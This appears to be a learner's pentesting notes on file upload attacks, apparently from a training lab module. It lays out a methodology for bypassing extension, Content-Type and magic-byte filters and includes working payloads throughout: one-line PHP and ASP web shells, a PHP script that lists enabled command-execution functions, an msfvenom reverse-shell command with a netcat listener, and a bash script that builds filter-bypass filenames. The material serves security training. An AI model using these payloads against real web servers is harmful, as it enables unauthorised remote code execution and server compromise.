
## Methodology:
1. fuzz allowed extensions
2. attempt upload. or fuzz double extension
3. fuzz content-type header image/FUZZ VIA INTRUDER
4. fuzz mimetype try GIF, PNG HDI MAGIC byte and random metadata
5. figure out where the uploaded shell get saved so you can browse to it
6-   find out what the server .htaccess is configured to allow
6. upload webshell, try XXE, XSS later if all methods exhausted
# Checking for PHP disabled_functions first

1. try to run phpinfo()
2. upload this php script to grep for allowed dangerous functions
I usualy use [Acunetix script](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/) that checks for PHP functions that are not disabled and can be used to serve our webshell:
```
<?php  
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));  
?>
```

This script gives us the best answers. Each function name that the script prints back on the screen is enabled and we can leverage for running OS commands or reading files (curl_exec) on the server.
for php: One good option for `PHP` is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell.

for other frameworks: [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can be found in the `/opt/useful/seclists/Web-Shells` directory in `PwnBox`.


`in certain cases, web shells may not work`. This may be due to the web server preventing the use of some functions utilized by the web shell (e.g. `system()`), or due to a Web Application Firewall, among other reasons. In these cases, we may need to use advanced techniques to bypass these security mitigations, but this is outside the scope of this module.
php:
```
<?php system($_request[cmd]); ?>
```
asp:
```
<% eval (request('cmd') %>
```
## Reverse Shells
One reliable reverse shell for `PHP` is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell. 
 [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) for other frameworks like .net aspx asp, ...etc 
#### msfvenom:
```shell-session
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

```shell-session
nc -lvnp OUR_PORT
```
While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.

# bypass frontend validation

intercept requests to back end and edit them, modify content-type
This will highlight the following HTML file input on line `18`:
or remove front end code for validation
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Here, we see that the file input specifies (`.jpg,.jpeg,.png`) as the allowed file types within the file selection dialog. However, we can easily modify this and select `All Files` as we did before, so it is unnecessary to change this part of the page.

The more interesting part is `onchange="checkFile(this)"`, which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation. To get the details of this function, we can go to the browser's `Console` by clicking [`CTRL+SHIFT+K`], and then we can type the function's name (`checkFile`) to get its details:
```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
```

## bypassing type filters
probably the backend also checks for these types so we can modify the `filename` and  `content` like so:

# example filename type and content bypass
![](Pasted%20image%2020250514143654.png)
# example filename type bypass
![](Pasted%20image%2020250514143617.png)
# whitelist Filter bypass
this filter checks for allowed types such as jpg, png, gif whatever its defined to allow.
## bypassing by Double Extensions
fuzz accepted extensions
fuzz .phpExt.jpg

```php
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
```
The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through `Double Extensions`.
(`shell.jpg.php`)

web applications may use a strict `regex` pattern, as mentioned earlier, like the following:
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

this pattern should only consider the final file extension, as it uses (`^.*\.`)
## Reverse Double Extension
the organization may use the insecure configurations for the web server.

For example, the `/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2` web server may include the following configuration
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches `.phar`, `.php`, and `.phtml`. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with (`$`).
## so where is the vulnerability?
Malicious code will execute because even though we end up with .jpg, web server allows for executing the first extension it sees.
eg 'shell.`php`'.jpg

---
## Character Injection Technique
We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.
The following are some of the characters we may try injecting:
- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist.

The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`

## Mutating extension word-lists by adding special characters

0.  find out which extension the server accepts using intruder: find wordlist with known php extensions
1.  fuzzing extensions using burpsuite turbo intruder and discovering that `.phar .phtml .php4` are all allowed
2. step 2. : Create wordlist with them.
3. run script to mutate the wordlist using special character techniques
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
4. run intruder with the new wordlist
---
## More file validation filters
# Content-Type
When you try to upload a webshell directly the browser sets the content type, 

When you upload a file through an HTTP request, there are indeed two different places where Content-Type headers can appear:


**Note:** A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.

## Example 1: Multipart Form Data Upload (Most Common)

In this case, you have both headers:
```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbC123
Content-Length: 12345

------WebKitFormBoundaryAbC123
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

[PDF binary data here]
------WebKitFormBoundaryAbC123--
```
Here:
1. The **main request header** has `Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbC123`
2. Inside the request body, each file part has its own **file Content-Type header**: `Content-Type: application/pdf`

## Example 2: Direct POST of File Content

In some cases, especially with API calls   , the file might be sent directly as the POST body:
```http
POST /upload
HTTP/1.1 
Host: example.com
Content-Type: application/pdf Content-Length: 8192 [PDF binary data here]
```
In this case, there's only one Content-Type header, which describes the file itself. There's no separate multipart structure with individual headers.

# MIMITYPE

The second and more common type of file content validation is testing the uploaded file's `MIME-Type`. `Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its general format and bytes structure.
**mime-type validation**
This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if a file starts with (`GIF87a` or `GIF89a`), this indicates that it is a `GIF` image, while a file starting with plaintext is usually considered a `Text` file.

If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

**Location**: Magic bytes are always at the beginning of the file, while other types of signatures might be embedded elsewhere.

# GIF
Many other image types have non-printable bytes for their file signatures, while a `GIF` image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string `GIF8` is common between both GIF signatures, it is usually enough to imitate a GIF image.
```BASH
echo "GIF8" > text.jpg 
file text.jpg
text.jpg: GIF image data
```

![](Pasted%20image%2020250515173959.png)
We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters.

For example, we can try using an `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.

---

## fuzzing content-type header
We may start by fuzzing the Content-Type header with SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) through Burp Intruder, to see which types are allowed. 

However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to `45` types only (compared to around 700 originally). We can do so as follows:
```shell-session
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```
### exercise:
exercise. CT HEADER INTRUDER
after fuzzing content-type, u get image/gif as allowed mime type:
![](Pasted%20image%2020250515175004.png)

set to png.phtml,
add shellcode after mime type: ![](Pasted%20image%2020250517223450.png)
![](Pasted%20image%2020250515175536.png)
![](Pasted%20image%2020250517223345.png)